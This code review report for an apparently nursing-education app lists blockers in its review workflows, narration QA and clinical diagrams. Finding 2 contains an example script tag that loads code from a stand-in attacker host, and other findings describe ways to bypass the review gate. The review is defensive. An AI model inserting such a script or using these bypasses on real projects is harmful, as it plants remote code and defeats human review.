## Assessment

Do not merge as ready. The review workflow has bypasses, the narration safety check can approve clinically incorrect speech, and several diagrams teach incorrect or incomplete content. The pairing map is currently empty, so diagram defects become student-facing when the normal population workflow is used. I reviewed the supplied code and tests statically; I could not run Vitest, the build, or external API calls.

## Findings

### 1. [blocker] Manual dispatch can certify a PR head without reviewing its changes

- **Where:** `.github/workflows/pulsern-astra-review.yml:38` · confidence high
- **Problem:** Dispatch accepts arbitrary base and head inputs, then posts the same required status used by PR review. runReview returns success when that range contains no files. Additionally, github.sha on workflow_dispatch identifies the selected dispatch ref, not necessarily the trusted base branch.
- **How it fails:** Dispatch from main with base=H and head=H for an unreviewed PR commit H. No model call occurs, but pulsern/astra-review becomes success on H. Selecting a feature-branch dispatch ref can also execute that branch's reviewer as 'trusted'.
- **Fix:** Derive the review range from the PR through GitHub's API and validate its current head. Pin the reviewer to an independently resolved trusted branch. Arbitrary-range/manual reviews must not publish the required PR status unless they cover that verified PR range.

### 2. [blocker] Page digests can completely hide executable changes

- **Where:** `pulsern/ops/astra-review.mjs:90` · confidence high
- **Problem:** pageDigest recognizes only quoted script sources and event handlers, truncates handlers, and discards styles and other attributes. Valid browser-executable markup can therefore produce no digest change.
- **How it fails:** Add <script src=https://evil.example/p.js></script> to an existing generated page. The script body is empty, its unquoted source is not recognized, and the body extraction removes the tag. The reviewer sees '(no textual change)' while browsers execute the new script.
- **Fix:** Do not use this lossy digest as the sole security review input. Preserve the raw diff for changes the representation cannot faithfully express, or use an HTML parser with complete executable attributes, scripts, styles, and resource references. Add the unquoted-script bypass as a regression test.

### 3. [blocker] Dependency summaries hide changes to Git dependency commits

- **Where:** `pulsern/ops/astra-review.mjs:125` · confidence high
- **Problem:** lockDigest retains only the resolved URL's host, package version, and an integrity prefix. Git dependencies commonly have no integrity field, and their executable source revision is in the discarded URL fragment.
- **How it fails:** A lockfile changes a dependency from git+ssh://git@github.com/org/pkg.git#commitA to the same URL with #commitB, retaining its package version. The digest is identical even though npm installs different code and potentially different install scripts.
- **Fix:** Include the complete resolved identity, including path and revision, and the complete integrity value. Review other installation-affecting lockfile changes or fall back to their raw diff. Test a same-host Git revision change.

### 4. [blocker] Audio QA accepts clinically significant word and number changes

- **Where:** `pulsern/ops/narrate-lib.mjs:103` · confidence high
- **Problem:** A 0.92 whole-clip character similarity does not protect clinical meaning. Dropping a negation or changing a digit in a long clip still passes. The wrong-number test is also misleading: terminal 'oh.' is not recognized by wordsToNumbers, so that example rejects even a correct digit-form transcript.
- **How it fails:** The potassium narration says calcium 'does not lower the potassium'. A recording transcribed as 'does lower the potassium', with the rest unchanged, exceeds the threshold and is uploaded. Similarly, an isolated incorrect numeric threshold can pass in a longer script.
- **Fix:** Require exact agreement on normalized numbers, units, negations, and clinically meaningful directional terms, with adjudication for other differences. Fix punctuation-aware number normalization. Test faithful and minimally corrupted versions of the same complete shipped scripts.

### 5. [blocker] A feature-branch narration run can overwrite audio already used in production

- **Where:** `pulsern/ops/narrate.mjs:128` · confidence high
- **Problem:** The storage name hashes synthesis inputs rather than the generated audio bytes, and upload uses upsert:true. TTS output is not guaranteed to be byte-identical for identical inputs. This makes the supposedly immutable public URL mutable before its manifest PR is reviewed.
- **How it fails:** A stale feature branch lacks a clip already recorded and deployed from another branch. Running narration regenerates the same input ID and overwrites that live URL. Students receive the new recording without the new branch being reviewed or merged.
- **Fix:** Use immutable objects addressed by the actual audio bytes, retain a separate synthesis-input cache key, and disable overwrites. Only a reviewed manifest change should switch the URL used by students.

### 6. [blocker] Publishing pairings does not require a passing visual review

- **Where:** `pulsern/ops/map-diagrams.mjs:54` · confidence high
- **Problem:** The mapper publishes matching cached attachment decisions without consulting the diagram-review verdict. The pairing reviewer sees claims and captions, not the rendered drawing. ConceptExplainers likewise checks only the question fingerprint and registry membership.
- **How it fails:** A diagram fails visual review because an arrow or highlighted structure teaches the wrong thing. Its textual claims remain correct, so pairing review approves attaching it. The mapper still writes it into the shipped map, and the app can display the rejected drawing.
- **Fix:** Require a current passing visual-review attestation before a diagram can enter the published map. Bind that approval to the reviewed rendering/content and fail closed for missing, failed, or stale approvals. Add an end-to-end test proving a failed visual verdict prevents publication.

### 7. [blocker] Opposing ABG abnormalities are incorrectly assumed to be compensation

- **Where:** `pulsern/src/diagrams/abg.jsx:36` · confidence high
- **Problem:** The interpreter labels opposing PaCO2/HCO3 abnormalities as partial or full compensation using only reference ranges and the side of pH 7.40. It never checks whether the magnitude is appropriate compensation, so mixed disorders receive definitive compensation labels.
- **How it fails:** For pH 7.40, PaCO2 20, and HCO3 12, the function reports 'Fully compensated'. Expected respiratory compensation for metabolic acidosis is approximately 26 ± 2 mmHg; PaCO2 20 indicates an additional respiratory alkalosis, not simply full compensation.
- **Fix:** Check expected compensation and flag mixed or indeterminate patterns, or explicitly restrict this to a simplified screening heuristic and withhold definitive compensation labels outside validated examples. Add physiologically consistent mixed-disorder tests.

### 8. [blocker] Isotonic crystalloids are incorrectly taught to stay in blood vessels

- **Where:** `pulsern/src/diagrams/tonicity.jsx:213` · confidence high
- **Problem:** The panel, accessible description, caption, and narration say isotonic fluid 'stays in the vessels'. No net movement across cell membranes does not mean confinement to the intravascular compartment.
- **How it fails:** A student studying normal saline or lactated Ringer's learns that the infused volume remains circulating. These crystalloids distribute through extracellular fluid, including the interstitial compartment; only roughly one quarter remains intravascular after equilibration under typical conditions.
- **Fix:** Explain extracellular distribution and distinguish cell membranes from capillary walls. Replace 'stays in vessels' everywhere, including narration, with accurate wording about expanding extracellular volume without a major net transcellular shift.

### 9. [blocker] Different basal insulin products are collapsed into one 24-hour profile

- **Where:** `pulsern/src/diagrams/insulin.jsx:20` · confidence high
- **Problem:** The long-acting profile assigns glargine and detemir an identical 24-hour duration, while extractInsulin also maps Toujeo into that profile. Detemir has dose-dependent duration that may be substantially shorter than 24 hours; glargine U-300 can last beyond 24 hours, up to about 36 hours.
- **How it fails:** A question naming Toujeo is mapped to type='long'. The worked caption says it provides a steady effect for about a day, and the drawing ends at 24 hours. A detemir question receives the same duration despite its different profile.
- **Fix:** Preserve product/formulation identity and use product-specific ranges. Exclude unsupported products from worked examples, as the extractor already does for degludec. Make captions, accessible descriptions, and reference tables agree with the supported scope.

### 10. [blocker] The static chickenpox diagram omits required contact precautions

- **Where:** `pulsern/src/diagrams/isolation.jsx:253` · confidence high
- **Problem:** The visible overview and SVG description list chickenpox only under airborne precautions with an N95 and negative-pressure room. The airborne-plus-contact qualification exists in reviewer facts and the final explainer caption, but not in the static teaching diagram students see first.
- **How it fails:** A student reads the concept-only isolation diagram without playing the final step and selects airborne precautions without gown and gloves for varicella.
- **Fix:** State 'airborne + contact' beside chickenpox in the overview and accessible description, and retain that qualification in the airborne step rather than postponing it until transport.

### 11. [major] The mapping CLI imports JSX through Node before Vite starts

- **Where:** `pulsern/ops/map-diagrams.mjs:25` · confidence high
- **Problem:** The static import of match.js transitively imports isolation.jsx and pressure-injury.jsx. The workflow runs this entry point with plain Node 22, which has no JSX loader. Creating a Vite server later cannot transform imports that Node must resolve before executing the module.
- **How it fails:** Running node ops/map-diagrams.mjs, including --dry-run, fails with ERR_UNKNOWN_FILE_EXTENSION for a .jsx dependency before reading questions or producing a report. Vitest's transformation hides this failure in the supplied unit tests.
- **Fix:** Move the pure extraction helpers into Node-compatible .js modules, or load the matcher through Vite's SSR loader after server creation. Add a smoke test invoking the actual CLI with plain Node.

### 12. [major] Failed pairing batches still produce a successful run

- **Where:** `pulsern/ops/map-diagrams.mjs:129` · confidence high
- **Problem:** Non-fatal review exceptions are appended to failedBatches, but code remains zero and stoppedFor remains null. The report can say 'complete' and the workflow's Verdict step succeeds even when every pairing batch failed.
- **How it fails:** OpenRouter rejects every request with a non-FatalLlmError, such as a malformed request or authentication error. The script records failures, continues through the queue, and exits 0 without successfully reviewing any candidates.
- **Fix:** Return a nonzero exit status when failedBatches is nonempty, distinguish failed and intentionally limited runs in the report, and stop repeated nonrecoverable failures. Test the orchestration with a reviewer that throws.

### 13. [major] Nested focus groups dim the very content the fluid step selects

- **Where:** `pulsern/src/diagrams/kit.jsx:53` · confidence high
- **Problem:** Each G independently applies opacity 0.18 unless its own ID is selected. The tonicity 'bags' and 'dextrose' steps select the outer 'fluids' group, but its nested 'fluids-iso', 'fluids-hypo', and 'fluids-hyper' groups remain unselected and dimmed.
- **How it fails:** On 'Know which bag is which', all three fluid lists are displayed at 18% opacity despite being the focus of the lesson. The small text becomes low-contrast and difficult to read.
- **Fix:** Make focus inheritance ancestor-aware, or explicitly focus the nested fluid groups for these steps. Test effective ancestor/descendant opacity rather than merely checking that focus IDs exist.

### 14. [major] Dark-theme explainer frames are rendered but never reviewed

- **Where:** `pulsern/ops/review-diagrams-lib.mjs:57` · confidence high
- **Problem:** imagePlan includes both static themes but only light-theme explainer steps. Dark-only problems in step annotations are therefore absent from the reviewer input and from reviewKey. The supplied test explicitly preserves this omission.
- **How it fails:** An OnStep annotation has unreadable contrast against its dim-theme background. It does not appear in the static overview, so neither the dark static image nor the light step images expose the defect. The diagram can retain a passing cached verdict.
- **Fix:** Include every explainer step in both themes, require the expected frames to exist, and hash all of them. Update the test to require complete theme-by-step coverage.

### 15. [major] Pause does not pause the diagram's animations

- **Where:** `pulsern/src/explainer.jsx:135` · confidence high
- **Problem:** The playing state controls only narration and caption timing. StepContext supplies no playback state, and Frame marks motion live whenever mounted without reduced motion. Infinite SMIL and CSS animations continue while the player says it is paused.
- **How it fails:** A student pauses the insulin curve, moving fluid particles, or pressure-injury demonstration to inspect the picture. The animation keeps moving, preventing inspection of the paused state.
- **Fix:** Propagate playback state to the motion layer and actually pause CSS and SVG animations while paused. Add mounted/browser tests that verify animation state after pressing Pause.

### 16. [major] Narration bypasses the reduced-motion no-auto-advance behavior

- **Where:** `pulsern/src/explainer.jsx:141` · confidence high
- **Problem:** The timed-caption effect respects reduce, but the audio onEnded handler always advances. This contradicts the player's documented guarantee that reduced-motion mode never advances on its own.
- **How it fails:** A student with reduced motion enabled manually plays narration for one step. When the clip ends, the player moves to the next step and continues playing its audio automatically.
- **Fix:** When reduced motion is enabled, stop playback at the end of the current clip and require explicit step navigation. Test audio completion with reduced motion enabled.

### 17. [major] Bot-generated commits do not trigger the promised PR review

- **Where:** `.github/workflows/pulsern-diagram-map.yml:86` · confidence high
- **Problem:** This workflow, diagram-review, and narrate push using the checkout action's GITHUB_TOKEN. GitHub suppresses ordinary workflow triggers caused by that token, so these pushes do not automatically start the pull_request_target review as their comments promise.
- **How it fails:** Run one of these workflows on a branch with an open PR. It pushes a new head containing mappings, narration, or reports, but no Astra review starts for that SHA. The required custom status remains missing until someone manually retriggers review.
- **Fix:** Explicitly dispatch the trusted, range-validated review after a successful push, or use an appropriately scoped GitHub App token whose push events trigger review. Verify this path with an integration test on an existing PR.
